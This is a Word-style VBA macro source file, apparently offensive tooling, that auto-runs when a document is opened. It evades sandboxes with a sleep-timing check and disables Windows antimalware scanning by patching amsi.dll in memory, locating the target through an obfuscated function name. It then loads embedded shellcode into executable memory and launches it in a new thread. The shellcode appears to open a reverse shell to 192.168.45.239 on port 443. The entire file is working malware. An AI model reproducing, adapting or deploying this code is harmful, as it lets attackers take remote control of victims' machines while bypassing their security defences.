Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
Private Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
Private Declare PtrSafe Function LL Lib "KERNEL32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function GPA Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VP Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function CT Lib "KERNEL32" Alias "CreateThread" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VA Lib "KERNEL32" Alias "VirtualAlloc" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RMM Lib "KERNEL32" Alias "RtlMoveMemory" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If

    If check() Then
        patch
    End If

    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    #If Win64 Then
        buf = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 81, 72, 49, 210, 101, 72, 139, 82, 96, 86, 72, 139, 82, 24, 72, 139, 82, 32, 77, 49, 201, 72, 139, 114, 80, 72, 15, 183, 74, 74, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 65, 81, 102, 129, 120, 24, _
11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 68, 139, 64, 32, 80, 73, 1, 208, 139, 72, 24, 227, 86, 72, 255, 201, 77, 49, 201, 65, 139, 52, 136, 72, 1, 214, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 65, 88, 72, 1, 208, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, _
188, 2, 0, 1, 187, 192, 168, 45, 239, 65, 84, 73, 137, 228, 76, 137, 241, 65, 186, 76, 119, 38, 7, 255, 213, 76, 137, 234, 104, 1, 1, 0, 0, 89, 65, 186, 41, 128, 107, 0, 255, 213, 106, 10, 65, 94, 80, 80, 77, 49, 201, 77, 49, 192, 72, 255, 192, 72, 137, 194, 72, 255, 192, 72, 137, 193, 65, 186, 234, 15, 223, 224, 255, 213, 72, 137, 199, 106, 16, 65, _
88, 76, 137, 226, 72, 137, 249, 65, 186, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 73, 255, 206, 117, 229, 232, 147, 0, 0, 0, 72, 131, 236, 16, 72, 137, 226, 77, 49, 201, 106, 4, 65, 88, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 85, 72, 131, 196, 32, 94, 137, 246, 106, 64, 65, 89, 104, 0, 16, 0, 0, 65, 88, 72, 137, 242, _
72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, _
255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)
    #Else
        buf = Array(252, 232, 143, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 15, 183, 74, 38, 139, 114, 40, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 87, 116, 76, 1, 208, 80, 139, 88, 32, 1, 211, 139, 72, 24, 133, 201, 116, 60, 49, 255, _
73, 139, 52, 139, 1, 214, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 51, 50, 0, 0, 104, 119, 115, 50, 95, 84, _
104, 76, 119, 38, 7, 137, 232, 255, 208, 184, 144, 1, 0, 0, 41, 196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 106, 10, 104, 192, 168, 45, 239, 104, 2, 0, 1, 187, 137, 230, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, 106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 255, 78, 8, 117, 236, 232, 103, 0, 0, 0, _
106, 0, 106, 4, 86, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 54, 139, 54, 106, 64, 104, 0, 16, 0, 0, 86, 106, 0, 104, 88, 164, 83, 229, 255, 213, 147, 83, 106, 0, 86, 83, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 104, 0, 64, 0, 0, 106, 0, 80, 104, 11, 47, 15, 48, 255, 213, 87, 104, 117, 110, 77, 97, 255, 213, _
94, 94, 255, 12, 36, 15, 133, 112, 255, 255, 255, 233, 155, 255, 255, 255, 1, 195, 41, 198, 117, 193, 195, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)

    #End If

    addr = VA(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RMM(addr + counter, data, 1)
    Next counter
    
    res = CT(0, 0, addr, 0, 0, 0)
End Function

Function check() As Boolean
    Dim strFile As String
    Dim szProcessName As String
    Dim hMod(0 To 1023) As LongPtr
    Dim numMods As Integer
    Dim res As LongPtr
    check = False
    
    strFile = Dir("c:\windows\system32\a?s?.d*")
    res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
    #If Win64 Then
        numMods = cbNeeded / 8
    #Else
        numMods = cbNeeded / 4
    #End If
    
    For i = 0 To numMods
        szProcessName = String$(50, 0)
        GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
        If Left(szProcessName, 8) = strFile Then
            check = True
        End If
        Next i
End Function

Function patch()
    Dim dllName As String
    Dim funcName As String
    Dim dll As LongPtr
    Dim addr As LongPtr
    Dim result As Long
    Dim ArrayPointer As LongPtr


    #If Win64 Then
        off = 352
        Dim MyByteArray(6) As Byte
        MyByteArray(0) = 184 ' 0xB8
        MyByteArray(1) = 87  ' 0x57
        MyByteArray(2) = 0   ' 0x00
        MyByteArray(3) = 7   ' 0x07
        MyByteArray(4) = 128 ' 0x80
        MyByteArray(5) = 195 ' 0xC3
    #Else
        off = 256
        Dim MyByteArray(8) As Byte
        MyByteArray(0) = 184 ' 0xB8
        MyByteArray(1) = 87  ' 0x57
        MyByteArray(2) = 0   ' 0x00
        MyByteArray(3) = 7   ' 0x07
        MyByteArray(4) = 128 ' 0x80
        MyByteArray(5) = 194 ' 0xC2
        MyByteArray(6) = 24  ' 0x18
        MyByteArray(7) = 0 ' 0x00
    #End If
    
    dllName = "ams" + "i.dll"
    dll = LL(dllName)
    addr = GPA(dll, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    
    #If Win64 Then
        result = VP(ByVal addr, 6, 64, 0)
        ArrayPointer = VarPtr(MyByteArray(0))
        RMM ByVal addr, ByVal ArrayPointer, 6
    #Else
        result = VP(ByVal addr, 8, 64, 0)
        ArrayPointer = VarPtr(MyByteArray(0))
        RMM ByVal addr, ByVal ArrayPointer, 8
    #End If
End Function


Sub test()
    MyMacro
End Sub

Sub Document_Open()
    test
End Sub

Sub AutoOpen()
    test
End Sub



